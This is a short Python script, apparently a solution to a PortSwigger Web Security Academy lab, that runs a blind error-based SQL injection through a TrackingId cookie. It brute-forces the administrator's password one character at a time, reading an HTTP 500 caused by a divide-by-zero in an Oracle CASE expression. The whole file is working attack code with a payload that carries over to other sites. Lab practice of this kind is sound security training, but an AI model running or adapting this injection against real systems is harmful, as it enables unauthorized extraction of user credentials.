import requests

possiblePass = "qwertyuiopasdfghjklzxcvbnm1234567890"
session = ""

password = ""
for i in range(1,21):
    for p in possiblePass:
        headers = {"Cookie": "TrackingId=N8PYzsNoxLz2BJp0' AND (SELECT CASE WHEN SUBSTR(password, " + str(i) + ", 1) = '" + p + "' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--",
                "session": session
                }
        body = None

        # Extract headers and body from the request text
        # Send the HTTP request
        response = requests.request("get","https://0af800380465894b80ce035700c20082.web-security-academy.net/login" , headers=headers)


        #status code 500 means that the server tried to calculate 1 divided by 0
        if(response.status_code == 500):
            password += p
            print(p)
            break

print(password)
